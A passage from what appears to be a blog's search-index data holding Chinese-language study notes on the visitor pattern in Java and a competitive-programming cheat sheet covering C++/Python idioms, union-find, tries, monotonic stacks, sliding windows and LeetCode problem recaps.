&#125;    TreeD accept(tTreeVisitorI ask) &#123;        return ask.forFlat(f, t);    &#125;&#125;class Split extends TreeD &#123;    TreeD l;    TreeD r;    Split(Treed _l, TreeD _r) &#123;        l = _l;        r = _r;    &#125;    boolean accept(bTreeVisitorI ask) &#123;        return ask.forSplit(l, r);    &#125;    int accept(iTreeVisitorI ask) &#123;        return ask.forSplit(l, r);    &#125;    TreeD accept(tTreeVisitorI ask) &#123;         return ask.forFlat(l, r);    &#125;&#125;\n不想每個return type都寫一個interface (那個時候應該還沒有泛型)\n把不同回傳type的值合併起來\ninterface TreeVisitorI &#123;    Object forBud();    Object forFlat(FruitD f, TreeD t);    Object forSplit(TreeD l, TreeD r);&#125;abstract class TreeD &#123;    abstract Object accept(TreeVisitorI ask);&#125;class IsFlatV implements TreeVisitorI &#123;    public Object forBud() &#123;        return new Boolean(true);    &#125;    public Object forFlat(FruitD f, TreeD t) &#123;        return t.accept(this);    &#125;    public Object forSplit(TreeD l, TreeD r) &#123;        return new Boolean(false);    &#125;&#125;class IsSplitV implements bTreeVisitorI &#123;    public boolean forBud() &#123;        return new Boolean(true);    &#125;    public boolean forFlat(FruitD f, TreeD t) &#123;        return new Boolean(false);    &#125;    public boolean forSplit(TreeD l, TreeD r) &#123;        if (((Boolean)(l.accept(this))).booleanValue())            return r.accept(this);        else            return new Boolean(false);    &#125;&#125;\n因為我們目前沒有範型，用範型才比較正常\nThe seventh bit of advice\nWhen designing visitor protocols for many different types, create a unifying protocol using Object.\nCh8 arith(abstract actions) &amp; 2 types of inherence\n到處都是cast\ninterface ExprVisitorI &#123;    Object forPlus(ExprD l, ExprD r); // 相加    Object forDiff(ExprD l, ExprD r); // 相减    Object forProd(ExprD l, ExprD r); // 相乘    Object forConst(Object c); // 常量&#125;class IntEvalV implements ExprVisitorI &#123;    public Object forPlus(ExprD l, ExprD r)&#123;        return plus(l.accept(this), r.accept(this));    &#125;    public Object forDiff(ExprD l, ExprD r)&#123;        return diff(l.accept(this), r.accept(this));    &#125;    public Object forProd(ExprD l, ExprD r)&#123;        return prod(l.accept(this), r.accept(this));    &#125;    public Object forConst(Object c)&#123;        return c;    &#125;    Object plus(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()+((Integer)r).intValue());    &#125;    Object diff(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()-((Integer)r).intValue());    &#125;    Object prod(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()*((Integer)r).intValue());    &#125;&#125;\n為了避免大量的轉換（其實就是隱藏plus, diff, prod的實作），所以把general action拉出來．\n再抽象一次\n假設這裡要一個對set操作的eval，那可以\n\n直接cast用method，簡單暴力\n\nclass SetEvalV extends IntEvalV &#123;    Object plus(Object l, Object r)&#123;        return ((SetD)l).plus((SetD)r);    &#125;    Object diff(Object l, Object r)&#123;        return ((SetD)l).diff((SetD)r);    &#125;    Object prod(Object l, Object r)&#123;        return ((SetD)l).prod((SetD)r);    &#125;&#125;\n\n重新拉一個class出來\n\nabstract class EvalD implements ExprVisitorI &#123;    public Object forPlus(ExprD l, ExprD r)&#123;        return plus(l.accept(this), r.accept(this));    &#125;    public Object forDiff(ExprD l, ExprD r)&#123;        return diff(l.accept(this), r.accept(this));    &#125;    public Object forProd(ExprD l, ExprD r)&#123;        return prod(l.accept(this), r.accept(this));    &#125;    public Object forConst(Object c)&#123;        return c;    &#125;    abstract Object plus(Object l, Object r);    abstract Object diff(Object l, Object r);    abstract Object prod(Object l, Object r);&#125;class IntEvalV extends EvalD &#123;    Object plus(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()+((Integer)r).intValue());    &#125;    Object diff(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()-((Integer)r).intValue());    &#125;    Object prod(Object l, Object r)&#123;        return new Integer(((Integer)l).intValue()*((Integer)r).intValue());    &#125;&#125;class SetEvalV extends EvalD &#123;    Object plus(Object l, Object r)&#123;        return ((SetD)l).plus((SetD)r);    &#125;    Object diff(Object l, Object r)&#123;        return ((SetD)l).diff((SetD)r);    &#125;    Object prod(Object l, Object r)&#123;        return ((SetD)l).prod((SetD)r);    &#125;&#125;\nThe eighth bits of advice\nWhen extending a class, use overriding to enrich its functionality.\n繼承有兩種，一個是繼承自通用class來做出自己想要的功能，這是理想case；而第二種是複寫原有功能的繼承，雖然說這不合理，然而現實中常常看不到別人的class，只能這樣來使用．\nCh9 extend visitor\n用繼承增加支援的type\n當要為datatype用那種比較討厭的繼承時來加variant時，visitor要怎麼調整\ndatatype shape = Union of Shape * Shape | …func f = …func newF(Union(a,b)) = ….      | newF(x) = f(x)\nclass Union extends ShapeD &#123;    ShapeD s;    ShapeD t;    Union(ShapeD _s, ShapeD _t) &#123;        s = _s;        t = _t;    &#125;    boolean accept(ShapeVisitorI ask) &#123; // 這裡是implement原本的abstract        ((UnionVisitorI)ask).forUnion(s, t); //要自己轉，不然看不到多加的part    &#125;&#125;interface UnionVisitorI extends ShapeVisitorI &#123; // interface 可以 extends !!!    boolean forUnion(ShapeD s, ShapeD t);&#125;class UnionHasPtV extends HasPtV implements ShapeVisitorI &#123;    UnionHasPtV(PointD _p) &#123;        super(_p);    &#125;    public boolean forUnion(ShapeD s, ShapeD t) &#123;        return s.accept(this) || t.accept(this);    &#125;&#125;\n抽象constructor\n這行Trans(CartP(3,7),Union(Square(10),Circle(10))).invoke(UnionV)\n陪下面的code，會出事\nclass HasPtV implements ShapeVisitorI &#123;    PointD p;    HasPtV(PointD _p) &#123;        p = _p;    &#125;    public boolean forCircle(int r) &#123;        return p.distanceTo0() &lt;= r;    &#125;    public boolean forSquare(int s) &#123;        return p.x &lt;= s &amp;&amp; p.y &lt;= s;    &#125;    public boolean forTrans(PointD q, ShapeD s) &#123;        return s.accept(new HasPtV(p.minus(q))); // 兇手    &#125;&#125;\n因為Trans會call到上一層的visitor，之後就回不來UnionHasPtV了！！\n所以要有辦法讓它能夠產生新的，抽象constrctor\nclass HasPtV implements ShapeVisitorI &#123;    PointD p;    HasPtV(PointD _p) &#123;        p = _p;    &#125;    ShapeVisitorI newHasPt(PointD p) &#123; // factory method        return new HasPtV(p);    &#125;    public boolean forCircle(int r) &#123;        return p.distanceTo0() &lt;= r;    &#125;    public boolean forSquare(int s) &#123;        return p.x &lt;= s &amp;&amp; p.y &lt;= s;    &#125;    public boolean forTrans(PointD q, ShapeD s) &#123;        return s.accept(newHasPtV(p.minus(q)));    &#125;&#125;\nThe nineth bit of advice\nIf a datatype may have to be extended, be forward looking and use a constructor-like(override) method so that visitors can be extended too.\nfactory method pattern\nclass UnionHasPtV extends HasPtV implements UnionVisitorI &#123;    UnionHasPtV(PointD _p) &#123;        super(_p);    &#125;    ShapeVisitorI newHasPt(PointD p) &#123; // factory method        return new UnionHasPtV(p);    &#125;    public boolean forUnion(ShapeD s, ShapeD t) &#123;        return s.accept(this) || t.accept(this);    &#125;&#125;\nCh10 Visitor pattern(obj作為打包好的參數&amp;state[直接修改obj])\n觀察在class的invoke，都只是把field的東西傳到closure中而已，那object其實可以直接access自己的field，那可以直接傳obj?\ninterface PieVisitorI &#123;    Object forBot(Bot that);    Object forTop(Top that);&#125;abstract class PieD &#123;    abstract Object accept(PieVisitorI ask);&#125;class Bot extends PieD &#123;    Object accept(PieVisitorI ask) &#123;        return ask.forBot(this);    &#125;&#125;class Top extends PieD &#123;    Object t;    PieD r;    Top(Object _t, Object _r) &#123;        t = _t;        r = _r;    &#125;    Object accept(PieVisitorI ask) &#123;        return ask.forTop(this);    &#125;&#125;class OccursV implements PieVisitorI &#123;    Object a;    OccursV(Object _a) &#123;        a = _a;    &#125;    public Object forBot(Bot that) &#123;        return new Integer(0);    &#125;    public Object forTop(Top that) &#123;        if (that.t.equals(a))            return new Integer(((Integer)(that.r.accept(this))).intValue()+1);        else            return that.r.accept(this);    &#125;&#125;\n現在是直接傳物件，那能不能直接改，這樣就不用new了\nclass SubstV implements PieVisitorI &#123;    Object n;    Object o;    SubstV(Object _n, Object _o) &#123;        n = _n;        o = _o;    &#125;    public Object forBot(Bot that) &#123;        return new Bot();    &#125;    public Object forTop(Top that) &#123;        if (o.equals(that.t))            return new Top(n, (PieD)(that.r).accept(this));        else            return new Top(that.t, (PieD)(that.r).accept(this));    &#125;&#125;class SubstV implements PieVisitorI &#123;    Object n;    Object o;    SubstV(Object _n, Object _o) &#123;        n = _n;        o = _o;    &#125;    public Object forBot(Bot that) &#123;        return that;    &#125;    public Object forTop(Top that) &#123;        if (o.equals(that.t))            that.t = n;  //直接被改完了，同時r也沒變，不用設回去        that.r.accept(this);        return that;    &#125;&#125;\nthe tenth bit of advice\nWhen modifications to objects are needed, use a class to insulate the operations that modify objects. Otherwise, beware the consequences of your actions.\nY in Java\ndatatype &#x27;a T = Into of &#x27;a T -&gt; &#x27;afun Y(f)= H(f)(Into(H(f)))and H(f)(a) = f(G(a))and G(Into(a))(x) = a(Into(a))(x);\nclass Mk &#123;  Func apply(Func f) &#123;      return new Fact(f);  &#125;&#125;class Fact &#123;  Func f;  Fact(Func _f) &#123;      f = _f;  &#125;  Integer apply(Integer x) &#123;      if (x == 0) return 1;      else return x * f.apply(x - 1);  &#125;&#125;class Y &#123;  Func apply(Mk f) &#123;      H h = new H(f);      return h.apply(h);  &#125;&#125;class H &#123;  Mk f;  H(Mk _f) &#123;      f = _f;  &#125;  H apply(H a) &#123;      return f.apply(new G(a));  &#125;&#125;class G &#123;  H h;  G(H _h) &#123;      h = _h;  &#125;  Integer apply(Integer x) &#123;      return h.apply(h).apply(x);  &#125;&#125;","categories":["Java","Reading"]},{"title":"competitive programming的tips","url":"/2021/07/competitive-programming-tips/","content":"動機\n現在習慣寫LC，都已經忘了怎麼用c++或是python來讀stdin，所以來整理一下\n\nC++\nstdin\n一般(空白分隔)\nint n;while (n &lt;&lt; cin) &#123;&#125;\n一整行\nstring name;while (getline (cin,name)) &#123;&#125;\n其他(有分隔號)\nstring name;while (getline (cin,name,&#x27;,&#x27;)) &#123;&#125;\nfile\nopen\n基本都是fstream，但如果只是要讀或寫可以直接用ifstream或ofstream\nstring name;ifstream fs;  fs.open(&quot;test.txt&quot;);  while (getline(fs,name)) &#123;&#125;\nread\n同stdin(cin)\nmap, unorder_map (set與其實是一樣的東西)\nmap就是自平衡二元搜尋樹，好像是rbtree，所以這個會替key排序\nunorder_map自然就是hash table了\n\niterate(C++11): for (auto&amp; kv : a_map) &#123; kv.first,kv.second; &#125;\niterate: for (map&lt;string, int&gt;::iterator it = a_map.begin(); it != a_map.end(); it++) &#123; it-&gt;first,it-&gt;second; &#125;\n\nstring operation\ncast\n\nstring-&gt;int\n\n// C++11#include &lt;string&gt;int n = stoi(&quot;123&quot;);double nn = stod(&quot;1.23&quot;);// C++98#include &lt;sstream&gt;int i;double d;// string -&gt; integerstd::istringstream ( &quot;123&quot; ) &gt;&gt; i;// string -&gt; double std::istringstream ( &quot;1.23&quot; ) &gt;&gt; d;\n\nint-&gt;string:\n\n// C++11#include &lt;string&gt;string n = to_string(123);string nn = to_string(1.23);// C++98#include &lt;sstream&gt;std::ostringstream ss1,ss2;ss1 &lt;&lt; 123;ss2 &lt;&lt; 1.23;cout &lt;&lt; ss1.str() &lt;&lt; &#x27;,&#x27; &lt;&lt; ss2.str();\ncommon operations\n\nsubstr: str.substr(start, len)\nlength: str.length()\nreverse: string reversed(str.rbegin(), str.rend()); or std::reverse(copy.begin(), copy.end());\nsplit(string -&gt; vector)\n\n用find找pos再substr，之後erase\n如果只有char用stringstream會好打一點\n\n\n\n// for string delimitervector&lt;string&gt; split (string s, string delimiter) &#123;    size_t pos_start = 0, pos_end, delim_len = delimiter.length();    string token;    vector&lt;string&gt; res;    while ((pos_end = s.find (delimiter, pos_start)) != string::npos) &#123;        token = s.substr (pos_start, pos_end - pos_start);        pos_start = pos_end + delim_len;        res.push_back (token);    &#125;    res.push_back (s.substr (pos_start));    return res;&#125;\nvector operation\n\npop, push_back\nslice:  std::vector&lt;int&gt;(v1.begin(), v1.begin()+ len); (創一個新的)\nlength: vec.size()\niterate: for (auto&amp; item : vec) &#123;&#125;\nreverse: vector&lt;int&gt; reversed(vec.rbegin(), vec.rend()); or std::reverse(copy.begin(), copy.end());\nmap(C++11): std::transform(nums.begin(), nums.end(), nums.begin(), [](int num) &#123;return std::pow(num, 2);&#125;);\nfilter(C++11): std::copy_if(nums.begin(), nums.end(), std::back_inserter(odd_nums), [](int num) &#123;return num &amp; 1;&#125;);\nreduce(C++11): #include &lt;numeric&gt; std::accumulate(vector.begin(), vector.end(), decltype(vector)::value_type(0));\n\nunion find\nunordered_map&lt;int,int&gt; fd;vector&lt;int&gt; rank;int find(int i) &#123;  while (i != fd[i])    fd[i] = fd[fd[i]], i = fd[i];  return i;&#125;void union(int i,int j) &#123;  int a = find(i), b = find(j);  if (a != b) &#123;    if (rank[i] &gt; rank[j])      fd[j] = i, rank[i]++;    else      fd[i] = j, rank[j]++;  &#125;&#125;\ntrie\nstruct Trie &#123;   unordered_map&lt;char, struct Trie*&gt; nextLevel;   bool end;        ~Trie() &#123;        for (auto&amp; kv : nextLevel) &#123;            delete kv.second;        &#125;    &#125;   void insert(string s) &#123;        Trie* trie = this;        for (auto&amp; c : s) &#123;            if (trie-&gt;nextLevel.find(c) == trie-&gt;nextLevel.end()) &#123;                trie-&gt;nextLevel[c] = new Trie();            &#125;            trie = trie-&gt;nextLevel[c];        &#125;        trie-&gt;end = 1;    &#125;    bool search(string s) &#123;        Trie* trie = this;        for (auto&amp; c : s) &#123;            if (trie-&gt;nextLevel.find(c) != trie-&gt;nextLevel.end()) &#123;                trie = trie-&gt;nextLevel[c];            &#125; else &#123;                return 0;            &#125;        &#125;        return trie-&gt;end;    &#125;        bool startsWith(string s) &#123;        Trie* trie = this;        for (auto&amp; c : s) &#123;            if (trie-&gt;nextLevel.find(c) != trie-&gt;nextLevel.end()) &#123;                trie = trie-&gt;nextLevel[c];            &#125; else &#123;                return 0;            &#125;        &#125;        return 1;    &#125;&#125;;\nPython\nstdin\n要記得rstrip，不然會有newline\nimport sysfor line in sys.stdin:    line.rstrip(&#x27;\\n&#x27;)    print(line)\n這裡有分隔號的讀嗎?\n其實有但很少用，而且要在open file時指定，不如用split，還比較快\npython的split不用自己刻\nfile\nwith open(&quot;file.txt&quot;,&#x27;wr&#x27;,encoding=&#x27;utf8&#x27;, newline=&#x27;\\r\\n&#x27;) as file_in:    lines = []    for line in file_in:        lines.append(line)    file_in.write(&#x27;write some str&#x27;)\ndict operations\n\niterate\n\nfor (k,v) in dd.items(): # keys, values    print(k,v)\nstring operation\n\nstr -&gt; int or float: int(&quot;123&quot;) float(&quot;1.23&quot;)\nnumder -&gt; str: str(123)\nreverse: str[::-1] or ''.join(reservsed(str))\nsplit: str.split(',')\nslice: str[start:end:step] str[2:0:-1]\n\n[start, end) start包含，end不包含\n\n\n\nlist operation\n\nappend, pop\njoin: ','.join(arr)\nslice: 同str\niterate\n\nfor item in mylist: # range(0,len(mylist))    print(item)\n\nlist comprehension: [n+1 for n in mylist if n % 2 is 0]\nmap: list(map(lambda x: x+1, mylist))\nfilter: list(filter(lambda x: x % 2 is 0, mylist))\nreduce:\n\nfrom functools import reducereduce(lambda acc,x: acc+x, a, 10)\ndeque operation\nq = deque()q.append(x)q.appendleft(x)q.pop()q.popleft()\nunion find\nfd = &#123; n:n for n in range(1,11)&#125;rank = [ 0 for n in range(1,11)] # how many ansestors does this item have?def find(fd,i):  while fd[i] != i:    fd[i] = fd[fd[i]] # path compression, 往祖先設定      i = fd[i]  return idef union(fd,rank,i,j):  a = fd[i]  b = fd[j]  if a != b:    if rank[i] &gt; rank[j]: # 子孫越多tree越平      fd[j] = i      rank[i] += 1    else:      fd[i] = j      rank[j] += 1\ntrie\ntrie = [&#123;&#125;,False]def addString(trie, s):  for c in s:    if c not in trie[0]:      trie[0][c] = [&#123;&#125;, False]    trie = trie[0][c]  trie[1] = Truedef find(trie, s):  for c in s:    if c in trie[0]:      trie = trie[0][c]    else:      return False  return trie[1]\ndp tips\n可以用functools.cache\n@functools.cachedef fib(n):  if n &lt; 2:    return 1  else:    return fib(n-1)+fin(n-2)\n如果有重複走的問題要自己處理\ndef cache_computing(f,is_computing=None):  mem = &#123;&#125;    @functools.wraps(f)  def wrapper(*args,**kwds):      if args not in mem:          mem[args] = is_computing          mem[args] = f(*args,**kwds)      return mem[args]  return wrapper\nAlgo經典手法與題目recap\nprefix sum\n用法\n\n算區間和\n\n和\n\n從a~b的總和\n如果有負數，可以代表偏離原點多遠\n\n\n一般來說，通常第一個會是0代表沒有加任何東西的狀態\n所以index從1開始，代表從arr[0]~arr[i-1]\n\n\n\nstatic (index -&gt; sum)\n\nlist(accumulate(nums, initial=0))\nLC209\n\n因為arr只有正數\n\n可以用sliding window，去收縮大小\n可以用prefix sum，在prefix sum做binary search\n\n我們會先列舉起點到終點\n所以prefix sum也是從起點去往後找終點\nTODO: LC209與LC525為什麼一個是從後面一個從前面\n\n\n\n\n\n\n\nin fly (sum -&gt; count or [index])\n\nLC560\n\n基本款\n\n\nLC525\n\n與LC209不同這裡是每加一個都會產生變化\n所以可以用in fly一邊建prefix sum，再找有沒有符合的\n注意同一個sum我們只要最前面的\n\n\n\nMonotonic stack\n用法\n\n根據關注點不同有不同的看法\n\n排序，留下最後的字典序 (stk是重點)\n\n1 3 7 2\n1 2\n\n可以看成2把3,7吃了，只留下該範圍最小的，這也是字典序的由來\n\n\n內容物:\n\n節點\n區塊\n\n\n\n\n夾出區間，中間是最大或是最小 (被pop的資料是重點)\n\nwhile stk and stk[-1] &lt;= n\n\n7 3 2 ..left.. 1 ..right.. 2\n\nright的所有數字都會小於1\nleft的所有數字都會等於1\n1是這個區間最大的\n\n\n\n\nwhile stk and stk[-1] &gt;= n\n\n1 2 3 ..left.. 7 ..right.. 2\n\nright的所有數字都會大於7\nleft的所有數字都會等於7\n7是這個區間最小的\n\n\n\n\n這樣就可以用stk[-2]與n，做出一個閉區間\n記得處理沒有stk的case\n\n\n\n\n在需要保持原本的順序、字典序、前面的資料會被後面的蓋掉時就可以老慮用用看\n\n夾出區間\n\nLC84\n\n經典\n小的柱子會被大的蓋掉，只取小的\n\n用成圖: 1,1,1,...1, 2,3,4, 10\n\n\n很明顯就是monotonic stack\n\n取pop出的柱子去乘左右兩邊構成的區間長度\n\n\n\n\nLC1130\n\n如果要最小一定是找最小的數字，之後是左右兩邊最小的\n\n化成圖: a .left. min .right. b\n有什麼辦法可以保證min一定是a~b之間最小的?\n\nmonotonic stack\n\nwhile stk and stk[-1] &lt;= n\n\n\n\n\n最後乘的時候要確認哪邊是小的!!\n\n\n\n\nLC1793\n\n就是LC84\n不過要在對的區間時才能更新答案\n\n這裡可以與LC402比\n\n402是控制pop\n\nTODO: 這樣stack的性質會是對的嗎?\n\n\n1793是控制更新答案\n\n\n\n\n\n\nLC1856\n\n區間中最小、又要連續\n\n化成圖: 7 3 2 ..left.. 1 ..right.. 2\n\n\n之後用prefix sum加速加總\n\n\nLC907\n\n區間中最小，monotonic stack\n\n化成圖: 1 2 3 ..left.. 7 ..right.. 2\n\n\n\n\nLC42\n\n只要被兩個柱子夾起來的部份而已!!\n\n\n\n排序\n\nLC402\n\n如果只是移除多的字以完成最小字典序不難就mono stack\n但是有限制次數，所以不能一直pop\n\n\nLC316\n\n同樣是移除字完成最小字典序\n但與LC402不同的是，這次是不能放入同樣的字\n\n注意到，這次條件是打在最外面\n只要重複就連stack都不pop\n\n但402是還可以放數字到stack\n\n\n\n\n\n\nLC768\n\n這題把stack的sort具體化，這話怎麼說\n前面提過小的會把大的吃掉，所以現在紀錄的是範圍最小\n但這題最後要留下範圍最大的item\n\n\nLC901\n\n就是LC768\n要記下區間最大值\n不過這題還要區間長度\n\n\nLC581\n\n可以用LC768去生chunk，之後把頭尾去掉，把所有長度加起來\nTODO: 但可以不用那麼麻煩\n\n\n\n下一個最大\n\nLC503\n\n這是monotonic stack的經典展現\n求下一個最大\n\n觸發pop的數字就是下一個最大\n\n\ncircular?\n\nnums兩倍長就好\n\n\n\n\nLC739\n\n求下一個最大之間的距離\n\n所以stack放index\n\n\n這裡會遇到一個有趣的case\n\n[1, 2, 2]要怎麼處理?\n\n加等號: 會讓後面的2被吃掉\n不加: 2留著\n\n\n怎麼叫更溫暖?\n\n大於，所以不加等號\n\n\n\n\n\n\n\n難\n\nLC456\n\n這要認真推\n先暴力\n\n原本1&lt;2&lt;3\n會從3開始找，之後2再來1\n會從最大的開始找!!\n\n\n但現在\n\n1&lt;3&lt;2\n這要從哪裡開始找?\n先從大的開始，所以是2\n\n但怎麼確認3\n(難的地方!!)\n\n從後面開始看\n這樣會有\n\n1 1 1 2 3 3 3\n\n\n\n\n之後是大小，2要大於3，最好會自動清\n\nmonotonic stack\n清出來的就是可能的2，而我們挑最大的\n要等號嗎?\n\n不用!!\n保留可能性\n\n\n\n\n\n\n\n\n所以要做的是\n\n從後往前，塞stack (3的候補)\n出現大的數字，清stack (2的候補)\n剩下只要比對是不是符合132\n\n\n\n\n\nclass Solution:    def find132pattern(self, nums: List[int]) -&gt; bool:        stk = []        mid = float(&#x27;-inf&#x27;)        for n in reversed(nums):            if n &lt; mid and stk:                return True                        while stk and stk[-1] &lt; n:                mid = max(mid,stk.pop())            stk += n,        return False\n\nLC862\n\n區間總和，但是\n\n有負數\n大於等於目標\n\n\n算區間和，prefix sum\n\n所以就一直記prefix sum，從最小的開始算和(queue)\n如果sum太大怎麼辦\n\n所以要清 (stack，這不單調，只是要清總和太大的項目)\n\n\n\n\n\n\n\nbinary search\nbsearch不一定要排序才能用\nbsearch最好用左閉右開\n注意mid會不會重複\n用法\n\n找目標\n猜數字\n逼近 (LC4)\n\n題目\n\nLC162\n\n右邊的點要在答案中\n\n也就是重合時會等於的值\n\n\n往大的方向走\n\n就算沒有sort也可以用!!\n\n\n\n\nLC4\n\n有sort也不一定看的出來可以用bsearch\n這裡重點是長度\n\n每次把小的區段丟掉\n\n\n\n\nLC1011\n\n猜每天要在多少重量\n但範圍是重點\n\n太大會很慢\n每一個貨物當成最重的重量，去算平均\n\n\n\n\nLC33\n\n確認兩件事\n\n哪一塊是遞增的\n目標在這一塊嗎\n\n\n另外\n\n如果長度是2，mid會輪迴!!\n\n\n\n\nLC153\n\n對rotate的長度做bsearch\n\n\nLC327\n\nprefix sum + 不等式\n\n用lower bound與upper bound找index\n\n\n\n\n\nsliding window\n基本\n用閉區間做\n列舉終點\na = 0win = []for b in range(len(fs)):    update_win()    while a &lt;= b and when_win_is_illegal():        shrink_win()    update_ret()return ret\n列舉起點\nb = 0win = []for a in range(len(fs)):    while b &lt; len(fs) and when_win_is_legal():        update_ret()        expand_win()    shrink_win()return ret\natMost\ndef atmost(bound):    ret = i = 0    for j,n in enumerate(nums):        update_win()        while i &lt;= j and when_win_is_illegal():            shrink_win()        ret += j-i+1    return ret\n題目\n\nLC220\n\n這裡index的abs用sliding window處理\n數字用不等式推論\n\n之後會看到lower bound\n\n\n\n\nLC995\n\n這裡的重點是處理flip\n\nflip的問題\n\n現在是什麼bit\n範圍到哪\n\n\n範圍就想到index\n\n所以要有方法追蹤有flip的index\n並在超出範圍時刷掉\n\nqueue做sliding window\n\n\n\n\n\n\n\n\nLC713\n\n用sliding window找最靠近k的window\n但接著就是怎麼算現在的window有多少組合?\n\n魔法: right-left + 1\n\n\n\n\n\nclass Solution:    def totalFruit(self, fs: List[int]) -&gt; int:        win = Counter()        a = 0        ret = 0        for b in range(len(fs)):            win[fs[b]] += 1            while a &lt;= b and len(win) &gt; 2:                win[fs[a]] -= 1                win += Counter()                a += 1            ret = max(ret, b-a+1)        return ret\n\nLC395\n\n長度是至少k\n\n所以不好當sliding window的條件\n需要別的條件\n\n\n字母只有26個\n\n限制最多多少字母可以出現在window中!!\n\n\n\n\nLC424\n\n怎麼找出有多少非法字\n\n總長度 = 最多的字 + 其他字\n\n\n\n\nLC992\n\n新招式: atMost\n\n小於等於limit有多少組合\n\n\n\n\nLC1234\n\nwindow中的東西可以亂生\n\n外面不超標的話就可以用window把string給平衡掉\n\n\n\n\nLC1248\n\n可以用atMost\n也可以之前的魔法\n\nright-left+1是以此點為終點的組合數\n之後就是在奇數到期時加到答案中\n\n\n\n\n\nmonotonic queue\n\nLC239\n\n明顯是sliding window\n但要最大值\n\nmonotonic stack\n\n\n還要顧index\n\ndeque\n\n\n兩個結合就是monotonic queue\n\n\n\ntwo pointer\nlinked list vs array\n\nLC148\n\n只能用merge sort\n因為不能隨機跳位置\n\n\nLC19\n\n這是list，一旦過了就回不去\n但可以像找中點，讓兩個ptr之間保持距離\n這裡是固定距離，中點是找兩倍\n\n\nLC61 &amp; LC189\n\n先談rotate array\n\n一個是Cyclic replace (不好做)\n另一個是\n\nreverse整條\nreverse 0~k 與 reverse k~end\n\n\n\n\n再談rotate list\n\n延續reverse的解法\n第一次reverse是把後面的拉到前面\n第二次reverse是把順序用成對的\n但這裡是list，所以可以直接把list分成兩個\n接上去就好\n\n\n\n\n\nindex,ptr as list\n\nLC283\n\n一個ptr做為0的list的終點\n另一個ptr是還沒看過的item的list的起點\n\n\nLC26\n\n同LC283\n一個終點一個起點，一直換\n\n\nLC905\n\n類似LC283\n但一個從array的頭，一個從尾塞\n\n\nLC75\n\n類似LC905\n但要記得從後面換的部分還是屬於沒看過的部分，所以還要再看一次\n\n\nLC86\n\n把list分一半\n兩個list指向list的終點\n\nLinked list需要確保每次新增node時不會loop\n\n要記得把next設成None\n\n\n\n\n\n\nLC143\n\n類似LC86\n\n\n\nclassic\n\nLC142\n\n判圈\n\n一個走一倍，一個走兩倍\n只要相遇就是圈\n\n\n圈的起點\n\n慢走的長度是\n\n起點到圈起點 + 某個數字*圈長度\n\n\n快走的長度是\n\n起點到圈起點 + 某個數字*圈長度\n\n\n兩個相減就會看到現在長度其實是\n\n圈長度的整數倍\n也就是說，不管從哪裡都可以算是圈的起點\n\n\n所以只要從起點走遇到另一個ptr就是圈的起點\n\n\n\n\nLC15\n\n3sum\n\n從頭開始走剩下的部分做2sum\n\n\n\n\nLC18\n\nnSum\n\n延伸3sum，直到只剩下2sum之前\n都是當成3sum處理\n\n\n\n\nLC876\n\nLinked List中點\n\n一個走一倍，一個走兩倍\n另一個到終點，現在的就是中點\n\n根據跳出來的條件可以看長度是奇數還是偶數\n\n因node.next跳出來，偶數\n因node.next.next跳出來，奇數\n\n\n\n\n\n\n\n\nLC287\n\n有很多解法\n\nbsearch (猜數字)\n注意到資料都是在index的範圍內\n\n可以用判圈\n可以把資料換到對應的index上\n\n另外該資料也會是0~i之間最大的\n\n見chunk那一題\n\n\n\n\n\n\n\n\n\n\n\nmisc\n\nLC986\n\nmerge interval可以\n把兩個interval看頭尾，挑最靠近裡面的部分\n\n在最小中挑最大\n在最大中挑最小\n如果新interval的頭大於尾，這新interval就是非法的\n每次都丟尾最小的\n\n\n\n\nLC844\n\n上stack\n直接從尾開始比，之後統計刪的次數，有counter時跳掉\n\n為什麼是尾開始\n\ndelete往前刪\n所以前面不會確定\n但後面不會被影響\n\n\n有點像moore voting\n\n\n\n\nLC763\n\n所有char都要在同一區\n一次一次紀錄每個char最後出線的index\n什麼時候才切成一區?\n\n當下的位置就是最後的位置時\n\n可以看chunk與LC287作對比\n\n\n\n\n\n\nLC42\n\n對於每個柱子，就是看\n\n左右都比自己高\n挑矮的，算差距\n\n\n因為每次都只看最矮的\n\n所以可以像2sum去縮\n\n\n\n\n\nheap\n\npython原本只有heapq，十分不好用\n\n但是可以搭配已經sort好的list去用他的heappop與heappush\n\nLC352\n\n\n\n\n可以用SordtedList好用超多，遠比C++的set或是map好用\n\ndivide and conquer\n\nLC327\n\n右邊index一定大於左邊\n針對每個左邊index找右邊符合需求的區間\n\n\nLC493\n\nTODO: 要看裡面怎麼用bit，感覺與divide and conquer有一點關係\n\n\n\nDynamic programming\nTODO\n\n刷表法 &amp; 填表法差別\n\n用途\n\n此點的狀態，像palindromic\n到目前為止的總和，一般的dp都是以此為目標去求\n\nfrom start or end\n\nLC198\n\ndp可以從\n\n起點開始算\n\n要先把整個長度算好\n\n這是環狀\n\n長度兩倍\n\n\n\n\n\n\n終點算回去\n\n簡單很多!!\n\nmax(self.ns[i] + self.dp(i-2), self.dp(i-1))\n\n\n\n\n\n\n\n\n任何dp都建議從終點算回去\n\nbottom-up 與 top-down\n\nLC718\n\n如果用top-down\n\n除了要看字有沒有一樣\n還要追蹤長度!!\n\n因為要連續\nf(i,j,l)\n\nmax(ret, f(i-1,j,0), f(i,j-1,0))\n\nret = f(i-1,j-1,k+1) if s[i] == s[j] else k\n\n\n\n\n這是n^3\n\n\n\n\n用bottom-up\n\ndp[i][j] = dp[i-1][j-1]+1 if if s[i] == s[j] else 0\n這是n^2\n因為是長度所以比起top-down少很多東西\n\n\n\n\nLC546\n\n真的什麼都想不到的話就是dp去模擬\n\n要什麼項目(參數、狀態定義)\n怎麼轉換\n\n\nf(i,j,k)\n\ni,j是範圍\nk是與j同顏色的盒子數量\n\n所以這裡就兩個case\n\n直接把所有盒子用掉，算分數\n抓中點，去增加k的數量\n\n[dp(i,x,k+1)+dp(x+1,j-1,0) for x in range(i,j) if boxes[x] == boxes[j]]\n\n\n\n\n\n\n\n\n\n\n\nclassic\n\nLC72\n\nedit dist\n\nreplace: (i-1,j-1)\ndelete: (i,j-1)\ninsert&quot; (i-1,j)\n\ninsert多一個字，又馬上比對，所以與delete相反\n\n\n\n\n\n\nLC647\n\npalindromic\n\ns[i] == s[j] and 